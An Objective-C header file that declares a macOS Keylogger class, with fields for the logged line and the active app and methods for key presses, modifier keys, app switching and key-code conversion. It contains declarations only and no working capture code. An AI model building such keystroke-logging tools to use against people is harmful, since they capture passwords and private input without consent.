//
//  Keylogger.h
//  Keylogger
//
//  Created by mosca1337 on 3/11/13.
//  Copyright (c) 2013 mosca1337. All rights reserved.
//

#import <Foundation/Foundation.h>

@interface Keylogger : NSObject {
    
    NSMutableString *logLine;
    NSString *lastApp;
    NSUInteger previousFlags;
}

@property (nonatomic, retain) NSMutableString *logLine;
@property (nonatomic, retain) NSString *lastApp;

- (void)logModifierKeys:(NSUInteger)modifierFlags;
- (void)handleKeyPress:(NSEvent*)event;
- (void)writeLine;
- (void)appDidActivate:(NSNotification *)notification;
- (NSString*)getAppName:(NSString*)appInfo;
- (NSString*)keyCodeConversion:(unsigned short)keyCode;

@end
